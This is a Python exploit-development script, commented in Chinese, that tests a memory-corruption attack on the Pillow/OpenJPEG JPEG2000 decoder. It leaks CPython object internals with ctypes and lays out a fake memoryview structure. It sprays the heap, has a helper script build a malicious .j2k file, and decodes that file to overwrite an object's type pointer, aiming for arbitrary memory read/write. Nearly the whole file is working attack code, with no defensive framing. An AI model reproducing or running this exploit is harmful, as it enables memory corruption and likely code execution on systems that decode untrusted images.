#!/usr/bin/env python3
# verify2.py —— 本地验证"破墙版": 文件只有几百字节时, 写出去的值是否仍是 ~12MB 级地址
import ctypes, struct, gc, subprocess, os
from PIL import Image

def R(a):
    return ctypes.c_uint64.from_address(a).value

probe = memoryview(bytearray(16))
F = R(id(probe) + 0x60); sh = R(id(probe) + 0x68); st = R(id(probe) + 0x70)
L = 0x260
c = bytearray(L)
def put(off, val):
    o = off - 0x20
    if o >= 0 and o + 8 <= L:
        c[o:o + 8] = struct.pack('<Q', val & 0xFFFFFFFFFFFFFFFF)
for off, val in [(0x38, 0xa40000), (0x40, 0), (0x48, 16), (0x50, 1), (0x58, 0x100000000),
                 (0x60, F), (0x68, sh), (0x70, st), (0x78, 0), (0x80, 0)]:
    put(off, val)
hold = [bytes(519) for _ in range(2000)] + [bytes(608) for _ in range(2000)]

tgt = 'A' * 600
TADDR = id(tgt)
print('目标 str id=%#x  (PyMemoryView_Type 期望 0xa350c8)' % TADDR, flush=True)

out = '/tmp/ojrw/repro/stage1b.j2k'
r = subprocess.run(['python3', 'builder2.py', 'base.j2k', out, '0', '23',
                    hex(0xa350c8), hex(0xa3c800), hex(TADDR)],
                   capture_output=True, text=True, cwd='/tmp/ojrw/repro')
print('builder2 -> %s' % (r.stdout.strip() or r.stderr.strip()[:200]), flush=True)
sz = os.path.getsize(out)
print('文件大小 = %d B (%.1f KB)   <-- 关键: 是否远小于 12MB' % (sz, sz / 1024.0), flush=True)

hits = []
for t in range(4):
    pairs = []
    for _ in range(400):
        D = bytes(519); v = bytes(c)
        pairs.append((D, v))
    vs = [v for D, v in pairs]
    del pairs; gc.collect()
    try:
        im = Image.open(out); im.load()
    except Exception as e:
        print('   decode err', repr(e)[:90], flush=True)
    h = [v for v in vs if R(id(v) + 8) == 0xa350c8]
    print('  命中(ob_type==PyMemoryView_Type) =', len(h), flush=True)
    if h:
        hits = h; break

if hits:
    mv = hits[0]
    buf = R(id(mv) + 0x38); ln = R(id(mv) + 0x48)
    print('mv1 buf=%#x len=%#x' % (buf, ln), flush=True)
    print('>>> %s' % ('★ 破墙成功: 小文件也能写出大值' if buf == TADDR else
                      ('值不对(接近? offset %+d)' % (buf - TADDR))), flush=True)
else:
    print('>>> 未命中: 破墙版没打进目标', flush=True)